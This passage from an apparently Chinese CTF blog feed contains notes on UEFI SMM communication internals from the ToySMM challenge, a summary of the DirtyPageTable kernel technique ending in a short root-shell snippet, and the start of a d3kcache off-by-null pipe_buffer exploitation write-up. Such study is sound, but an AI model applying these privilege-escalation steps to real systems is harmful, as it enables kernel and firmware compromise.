class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">//EFI_ALLOCATE_TYPE</span></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">// These types are discussed in the &quot;Description&quot; section below.</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">   AllocateAnyPages,</span><br><span class="line">   AllocateMaxAddress,</span><br><span class="line">   AllocateAddress,</span><br><span class="line">   MaxAllocateType</span><br><span class="line">&#125; EFI_ALLOCATE_TYPE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">//EFI_MEMORY_TYPE</span></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">// These type values are discussed in Memory Type Usage before ExitBootServices()  and  Memory Type Usage after ExitBootServices().</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">   EfiReservedMemoryType,</span><br><span class="line">   EfiLoaderCode,</span><br><span class="line">   EfiLoaderData,</span><br><span class="line">   EfiBootServicesCode,</span><br><span class="line">   EfiBootServicesData,</span><br><span class="line">   EfiRuntimeServicesCode,</span><br><span class="line">   EfiRuntimeServicesData,</span><br><span class="line">   EfiConventionalMemory,</span><br><span class="line">   EfiUnusableMemory,</span><br><span class="line">   EfiACPIReclaimMemory,</span><br><span class="line">   EfiACPIMemoryNVS,</span><br><span class="line">   EfiMemoryMappedIO,</span><br><span class="line">   EfiMemoryMappedIOPortSpace,</span><br><span class="line">   EfiPalCode,</span><br><span class="line">   EfiPersistentMemory,</span><br><span class="line">   EfiUnacceptedMemoryType,</span><br><span class="line">   EfiMaxMemoryType</span><br><span class="line">&#125; EFI_MEMORY_TYPE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="comment">//EFI_PHYSICAL_ADDRESS</span></span><br><span class="line"><span class="comment">//******************************************************</span></span><br><span class="line"><span class="keyword">typedef</span> UINT64 EFI_PHYSICAL_ADDRESS;</span><br></pre></td></tr></table></figure><p><strong>Description</strong></p><p>The AllocatePages() function allocates the requested number of pages and returns a pointer to the base address of the page range in the location referenced by <em>Memory</em>. The function scans the memory map to locate free pages. When it finds a physically contiguous block of pages that is large enough and also satisfies the allocation requirements of <em>Type</em>, it changes the memory map to indicate that the pages are now of type <em>MemoryType</em>.</p><p>In general, UEFI OS loaders and UEFI applications should allocate memory (and pool) of type EfiLoaderData. UEFI boot service drivers must allocate memory (and pool) of type EfiBootServicesData. UREFI runtime drivers should allocate memory (and pool) of type EfiRuntimeServicesData (although such allocation can only be made during boot services time).</p><p>Allocation requests of <em>Type</em> AllocateAnyPages allocate any available range of pages that satisfies the request. On input, the address pointed to by <em>Memory</em> is ignored.</p><p>Allocation requests of <em>Type</em> <em>AllocateMaxAddress</em> allocate any available range of pages whose uppermost address is less than or equal to the address pointed to by <em>Memory</em> on input.</p><p>Allocation requests of <em>Type</em> AllocateAddress allocate pages at the address pointed to by <em>Memory</em> on input.</p><p><strong>NOTE</strong>: <em>UEFI drivers and UEFI applications that are not targeted for a specific implementation must perform memory allocations for the following runtime types using AllocateAnyPages address mode:</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EfiACPIReclaimMemory,</span><br><span class="line">EfiACPIMemoryNVS,</span><br><span class="line">EfiRuntimeServicesCode,</span><br><span class="line">EfiRuntimeServicesData,</span><br><span class="line">EfiReservedMemoryType.</span><br></pre></td></tr></table></figure><p><strong>Status Codes Returned</strong></p><div class="table-container"><table><thead><tr><th>EFI_SUCCESS</th><th>The requested pages were allocated.</th></tr></thead><tbody><tr><td>EFI_OUT_OF_RESOURCEST</td><td>The pages could not be allocated.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>Type</em> is not AllocateAnyPages or AllocateMaxAddress or AllocateAddress</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>MemoryType</em> is in the range EfiMaxMemoryType..0x6FFFFFFF.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>MemoryType</em> is EfiPersistentMemoryType or EfiUnacceptedMemory.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>Memory</em> is NULL.</td></tr><tr><td>EFI_NOT_FOUND</td><td>The requested pages could not be found.</td></tr></tbody></table></div><hr><blockquote><p>AllocatePool</p><p>Allocates a pool of a particular type.</p></blockquote><p><strong>Summary</strong></p><p>Allocates pool memory.</p><p><strong>Prototype</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef</span><br><span class="line">EFI_STATUS</span><br><span class="line">(EFIAPI  *EFI_ALLOCATE_POOL) (</span><br><span class="line">   IN EFI_MEMORY_TYPE            PoolType,</span><br><span class="line">   IN UINTN                      Size,</span><br><span class="line">   OUT VOID                      **Buffer</span><br><span class="line">   );</span><br></pre></td></tr></table></figure><p><strong>Parameters</strong></p><ul><li><p>PoolType</p><p>The type of pool to allocate. Type EFI_MEMORY_TYPE is defined in the <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-allocatepages">EFI_BOOT_SERVICES.AllocatePages()</a> function description. <em>PoolType</em> values in the range 0x70000000..0x7FFFFFFF are reserved for OEM use. <em>PoolType</em> values in the range 0x80000000..0xFFFFFFFF are reserved for use by UEFI OS loaders that are provided by operating system vendors.</p></li><li><p>Size</p><p>The number of bytes to allocate from the pool.</p></li><li><p>Buffer</p><p>A pointer to a pointer to the allocated buffer if the call succeeds; undefined otherwise.</p></li></ul><p><strong>Note:</strong> <em>UEFI applications and UEFI drivers must not allocate memory of type</em> EfiReservedMemoryType.</p><p><strong>Description</strong></p><p>The AllocatePool() function allocates a memory region of Size bytes from memory of type <em>PoolType</em> and returns the address of the allocated memory in the location referenced by <em>Buffer</em>. This function allocates pages from EfiConventionalMemory as needed to grow the requested pool type. All allocations are eight-byte aligned.</p><p>The allocated pool memory is returned to the available pool with the <a href="https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#id17">EFI_BOOT_SERVICES.FreePool()</a> function.</p><p><strong>Status Codes Returned</strong></p><div class="table-container"><table><thead><tr><th>EFI_SUCCESS</th><th>The requested number of bytes was allocated.</th></tr></thead><tbody><tr><td>EFI_OUT_OF_RESOURCES</td><td>The pool requested could not be allocated.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>PoolType</em> is in the range EfiMaxMemoryType..0x6FFFFFFF.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>PoolType</em> is EfiPersistentMemory.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>Buffer</em> is NULL.</td></tr></tbody></table></div><hr><p>The agent invoking the communication interface at runtime may be virtually mapped. The MM infrastructure code and handlers, on the other hand, execute in physical mode.As a result, the non- MM agent, which may be executing in the virtual-mode OS context as a result of an OS invocation of the UEFI SetVirtualAddressMap() service, should use a contiguous memory buffer with a physical address before invoking this service. If the virtual address of the buffer is used, the MM Driver may not know how to do the appropriate virtual-to-physical conversion.<br>在<a href="https://edk2.groups.io/g/devel/topic/30910271">这里</a>讨论了这个问题，指出<code>EfiReservedMemoryType</code>, <code>EfiACPIMemoryNVS</code>或<code>EfiRuntimeServicesData</code>可以满足条件，<strong>最后发现<code>EfiRuntimeServicesData</code>类型的内存可以让<code>SmmCommunication-&gt;Communicate</code>返回<code>EFI_SUCCESS</code></strong>，推测完成了与SMM的态通信，也可以结合<a href="https://github.com/tianocore/edk2/blob/3840c35e34d1c992268092b6366e26f2acc55a75/UefiCpuPkg/PiSmmCommunication/PiSmmCommunicationPei.c#L275">源码</a>来具体分析。</p><h2 id="debugon"><a href="#debugon" class="headerlink" title="debugon"></a>debugon</h2><p>在qemu启动脚本中加入这一句</p><p><code>-global isa-debugcon.iobase=0x402 -debugcon file:./debug.log</code></p><p>之后<code>cat debug.log</code>即可获得许多调试信息</p><h2 id="SMRAM"><a href="#SMRAM" class="headerlink" title="SMRAM"></a>SMRAM</h2><p>SMM状态下有类似SMAP和SMEP这样的保护</p><p>其只能访问位于SMRAM的内存</p><p>否则会有检测<a href="https://github.com/tianocore/edk2/blob/master/MdePkg/Library/SmmMemLib/SmmMemLib.c">edk2/MdePkg/Library/SmmMemLib/SmmMemLib.c at master · tianocore/edk2 (github.com)</a></p><h2 id="SMI流程"><a href="#SMI流程" class="headerlink" title="SMI流程"></a>SMI流程</h2><p>我们一般直接交互处于DXE状态</p><p>通过SMI进入SMM后：</p><ul><li>会将当前状态存在SMBASE + 0x8000 + 0x7c00，比如各个寄存器的值</li><li>执行SMBASE + 0x8000处的代码</li></ul><p>SMBASE + 0x8000会被初始化为gcSmiHandlerTemplate</p><p>函数调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcSmiHandlerTemplate</span><br><span class="line">-&gt; SmiRendezvous</span><br><span class="line">-&gt; BSPHandler</span><br><span class="line">-&gt; gSmmCpuPrivate-&gt;SmmCoreEntry</span><br><span class="line">   SmmEntryPoint</span><br><span class="line">-&gt; SmiManage (IMAGE, GUID, CommBuffer)</span><br></pre></td></tr></table></figure><p>SmiManage中最后会执行之前注册的Handler，ToySMM中是ToyMain</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Status             = SmiHandler-&gt;Handler (</span><br><span class="line">                                   (EFI_HANDLE)SmiHandler,</span><br><span class="line">                                   Context,</span><br><span class="line">                                   CommBuffer,</span><br><span class="line">                                   CommBufferSize</span><br><span class="line">                                   );</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>SmmEntryPoint将gSmmCorePrivate-&gt;CommunicationBuffer的数据传递给了SmiManage，<strong>gSmmCorePrivate是个全局变量</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">  </span><br><span class="line">   CommunicationBuffer = gSmmCorePrivate-&gt;CommunicationBuffer;</span><br><span class="line">   BufferSize          = gSmmCorePrivate-&gt;BufferSize;</span><br><span class="line">  </span><br><span class="line">……</span><br><span class="line">  </span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       CommunicateHeader = (EFI_SMM_COMMUNICATE_HEADER *)CommunicationBuffer;</span><br><span class="line">       <span class="comment">// BufferSize was updated by the SafeUintnSub() call above.</span></span><br><span class="line">       Status = SmiManage (</span><br><span class="line">                  &amp;CommunicateHeader-&gt;HeaderGuid,</span><br><span class="line">                  <span class="literal">NULL</span>,</span><br><span class="line">                  CommunicateHeader-&gt;Data,</span><br><span class="line">                  &amp;BufferSize</span><br><span class="line">                  );</span><br><span class="line">   ……</span><br><span class="line"></span><br><span class="line">C</span><br></pre></td></tr></table></figure></li><li><p>SmiManage调用SmmCoreFindSmiEntry通过HandlerType（GUID）查找之前注册的SmiHandler，调用Handler</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmiManage</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN     CONST EFI_GUID  *HandlerType,</span></span><br><span class="line"><span class="params">  IN     CONST VOID      *Context         OPTIONAL,</span></span><br><span class="line"><span class="params">  IN OUT VOID            *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="params">  IN OUT UINTN           *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">    ……</span><br><span class="line">    </span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Non-root SMI handler</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    SmiEntry = SmmCoreFindSmiEntry ((EFI_GUID *)HandlerType, FALSE);</span><br><span class="line">    </span><br><span class="line">    ……</span><br><span class="line">    </span><br><span class="line">    Status             = SmiHandler-&gt;Handler (</span><br><span class="line">                                       (EFI_HANDLE)SmiHandler,</span><br><span class="line">                                       Context,</span><br><span class="line">                                       CommBuffer,</span><br><span class="line">                                       CommBufferSize</span><br><span class="line">                                       );</span><br><span class="line">    </span><br><span class="line">    ……</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">C</span><br></pre></td></tr></table></figure></li></ul><p>gSmmCorePrivate全局变量定义在PiSmmIpl模块，被初始化为mSmmCorePrivateData</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SMM_CORE_PRIVATE_DATA  *gSmmCorePrivate = &amp;mSmmCorePrivateData;</span><br></pre></td></tr></table></figure><h2 id="全局comm变量"><a href="#全局comm变量" class="headerlink" title="全局comm变量"></a>全局comm变量</h2><p>在ToySMM那题的第二种exp写法中,这位师傅并不分配新的结构体然后再去调用<code>communicate()</code>,而是直接布置在全局变量中并触发(见上一小节),尽管完全可以用写法1替代,但我仍然疑惑那些变量是如何找到的</p><p>最终我在源代码中找到了这些</p><p>在<code>/MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c#L267</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// SMM Communication Protocol instance</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">EFI_SMM_COMMUNICATION_PROTOCOL  mSmmCommunication = &#123;</span><br><span class="line">  SmmCommunicationCommunicate</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// PI 1.7 MM Communication Protocol 2 instance</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">EFI_MM_COMMUNICATION2_PROTOCOL  mMmCommunication2 = &#123;</span><br><span class="line">  SmmCommunicationMmCommunicate2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// SMM Core Private Data structure that contains the data shared between</span></span><br><span class="line"><span class="comment">// the SMM IPL and the SMM Core.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">SMM_CORE_PRIVATE_DATA  mSmmCorePrivateData = &#123;</span><br><span class="line">  SMM_CORE_PRIVATE_DATA_SIGNATURE,    <span class="comment">// Signature</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// SmmIplImageHandle</span></span><br><span class="line">  <span class="number">0</span>,                                  <span class="comment">// SmramRangeCount</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// SmramRanges</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// SmmEntryPoint</span></span><br><span class="line">  FALSE,                              <span class="comment">// SmmEntryPointRegistered</span></span><br><span class="line">  FALSE,                              <span class="comment">// InSmm</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// Smst</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// CommunicationBuffer</span></span><br><span class="line">  <span class="number">0</span>,                                  <span class="comment">// BufferSize</span></span><br><span class="line">  EFI_SUCCESS                         <span class="comment">// ReturnStatus</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Global pointer used to access mSmmCorePrivateData from outside and inside SMM</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">SMM_CORE_PRIVATE_DATA  *gSmmCorePrivate = &amp;mSmmCorePrivateData;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// SMM IPL global variables</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">EFI_SMM_CONTROL2_PROTOCOL  *mSmmControl2;</span><br><span class="line">EFI_SMM_ACCESS2_PROTOCOL   *mSmmAccess;</span><br><span class="line">EFI_SMRAM_DESCRIPTOR       *mCurrentSmramRange;</span><br><span class="line">BOOLEAN                    mSmmLocked = FALSE;</span><br><span class="line">BOOLEAN                    mEndOfDxe  = FALSE;</span><br><span class="line">EFI_PHYSICAL_ADDRESS       mSmramCacheBase;</span><br><span class="line">UINT64                     mSmramCacheSize;</span><br><span class="line"></span><br><span class="line">EFI_SMM_COMMUNICATE_HEADER                  mCommunicateHeader;</span><br><span class="line">EFI_LOAD_FIXED_ADDRESS_CONFIGURATION_TABLE  *mLMFAConfigurationTable = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>但又令我困惑的是在实际内存中,这些变量似乎并没有按照源码中的间隔排布(顺序是对的,但中间插入了许多其他变量)</p><p>不过我们也能够确定偏移,以<code>mSmmCommunication</code>偏移为0</p><div class="table-container"><table><thead><tr><th>name</th><th>offset</th></tr></thead><tbody><tr><td>mSmmCommunication</td><td>0</td></tr><tr><td>mSmmCorePrivateData</td><td>0x70</td></tr><tr><td>mSmmCorePrivateData.CommunicationBuffer</td><td>0xa8</td></tr><tr><td>mSmmCorePrivateData.BufferSize</td><td>0xb0</td></tr><tr><td>mCommunicateHeader.HeaderGuid</td><td>0xf0</td></tr><tr><td>mCommunicateHeader.MessageLength</td><td>0x100</td></tr><tr><td>mCommunicateHeader.Data</td><td>0x108</td></tr></tbody></table></div><p>不知道是否会受版本影响,如果不同另外调试便是</p>]]></content>
    
    
    <summary type="html">hard</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="uefi" scheme="https://ixout.github.io/tags/uefi/"/>
    
  </entry>
  
  <entry>
    <title>DirtyPageTable</title>
    <link href="https://ixout.github.io/posts/29003/"/>
    <id>https://ixout.github.io/posts/29003/</id>
    <published>2024-04-06T12:15:31.000Z</published>
    <updated>2024-04-18T09:11:31.840Z</updated>
    
    <content type="html"><![CDATA[<p>Original blog:<a href="https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">Dirty_Pagetable (yanglingxi1993.github.io)</a></p><p>做一些记录</p><h1 id="How-DirtyPageTable-Works"><a href="#How-DirtyPageTable-Works" class="headerlink" title="How DirtyPageTable Works"></a>How DirtyPageTable Works</h1><p>先简单过一遍DirtyPageTable的流程,以最常见的UAF为例</p><ol><li><p>获得一个UAF obj,将其释放回到slab中,并将slab中所有其他的obj全部释放,这样该slab就变成了空slab,</p><p>从而回到伙伴系统中</p></li><li><p>大量分配用户页表,使得用户页表占用victim slab</p></li><li><p>构造用于操作页表条目 (PTE) 的原语</p></li><li><p>修改PTE,使得将该PTE的物理内存变为内核代码/数据的物理内存,例如我们可以修改setresuid(),setresgid()等函数对是否具有调用权限的判别</p></li><li><p>getroot</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure></li></ol><p>这就是整个DiryPageTable的工作流程了,原理并不复杂,和USMA非常相似</p><p>需要解决的问题有两个:</p><ol><li>如何得到UAF,并且获得操作页表条目的能力</li><li>如何得到目标地址的物理内存地址</li></ol><p>利用手法提出者给了我们三种示范</p><h1 id="DPT-with-CVE-2023-21400"><a href="#DPT-with-CVE-2023-21400" class="headerlink" title="DPT with CVE-2023-21400"></a>DPT with CVE-2023-21400</h1>]]></content>
    
    
    <summary type="html">magic</summary>
    
    
    
    <category term="-pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="dirtypagetable" scheme="https://ixout.github.io/tags/dirtypagetable/"/>
    
  </entry>
  
  <entry>
    <title>从d3cache看页级堆风水与一个off-by-null导致的任意读写</title>
    <link href="https://ixout.github.io/posts/10326/"/>
    <id>https://ixout.github.io/posts/10326/</id>
    <published>2024-03-24T13:37:46.000Z</published>
    <updated>2024-04-05T06:25:53.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id="D3CTF2022-d3kcache"><a href="#D3CTF2022-d3kcache" class="headerlink" title="D3CTF2022-d3kcache"></a>D3CTF2022-d3kcache</h1><p>这题原本是记录在kernel习题记录的,但是深入理解arttnba3师傅的博客后,发现这题蕴含的知识太丰富了</p><p>于是打算单独开一篇文章,好好赏析一番</p><p>另外,arttnba3师傅tql!!!orz</p><h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><p>常规保护kaslr,kpti,smap,smep等等都是拉满的</p><p>除此之外在config中还可以看到开启了<code>CONFIG_CFI_CLANG</code>保护</p><p>google可以得知一下信息</p><blockquote><p>This option enables Clang’s forward-edge Control Flow Integrity (CFI) checking, where the compiler injects a runtime check to each indirect function call to ensure the target is a valid function with the correct static type. This restricts possible call targets and makes it more difficult for an attacker to exploit bugs that allow the modification of stored function pointers. More information can be found from Clang’s documentation:</p><p><a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">https://clang.llvm.org/docs/ControlFlowIntegrity.html</a></p></blockquote><p>即选中了该选项的内核编译时,会在间接函数跳转处加入更多的检查,确保间接函数指针不被劫持</p><p>说简单点就是在发生call调用后,会在跳转目标头部做一些检查</p><p>这样一来,函数指针表将会受到严格保护,像修改函数指针虚表这样的流劫持,就很难利用了,因为不能劫持函数指针为gadget!!</p><h2 id="模块分析"><a href="#模块分析" class="headerlink" title="模块分析"></a>模块分析</h2><p>模块创建了一个obj为2048大小的slab分配器</p><p>并通过ioctl实现了常规的note增加,删除,追加和展示等功能</p><p>唯一关键的点在于追加过程中会导致一个<code>off-by-null</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">1300</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( idx &lt;= <span class="number">0xF</span>uLL &amp;&amp; kcache_list[idx].ptr )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = input_size;</span><br><span class="line">          <span class="keyword">if</span> ( input_size &gt; <span class="number">0x800</span> || input_size + kcache_list[idx].size &gt;= <span class="number">0x800</span> )</span><br><span class="line">            v7 = <span class="number">2048</span> - kcache_list[idx].size;</span><br><span class="line">          <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">            BUG();</span><br><span class="line">          v8 = (<span class="type">char</span> *)kcache_list[idx].ptr + (<span class="type">unsigned</span> <span class="type">int</span>)kcache_list[idx].size;<span class="comment">// append</span></span><br><span class="line">          v9 = (<span class="type">unsigned</span> <span class="type">int</span>)v7;</span><br><span class="line">          v10 = input_ptr;</span><br><span class="line">          _check_object_size(v8, (<span class="type">unsigned</span> <span class="type">int</span>)v7, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !copy_from_user(v8, v10, v9) )</span><br><span class="line">          &#123;</span><br><span class="line">            v8[v9] = <span class="number">0</span>;<span class="comment">//off-by-null</span></span><br><span class="line">            v5 = <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">        &#125;</span><br><span class="line">        v25 = &amp;unk_837;</span><br><span class="line">LABEL_46:</span><br><span class="line">        printk(v25);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>在内核中仅有一个<code>off-by-null</code>漏洞似乎难以利用</p><p>不过当我们遍历那些内核pwn中常利用的结构体之后,我们可以发现<code>pipe_buffer</code>是一个十分适合的对象</p><p>其既可以读也可以写,而读写目标完全由其<code>page</code>成员决定,并且<code>page</code>成员就在结构体的起始处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们知道<code>struct page</code>对应着唯一一个物理页,每个<code>struct page</code>的大小是0x40</p><p>那么如果我们的<code>off-by-null</code>漏洞刚好作用在pipe_buffer的<code>page</code>字段,岂不是就会使得两个pipe_buffer的page字段指向同一个<code>struct 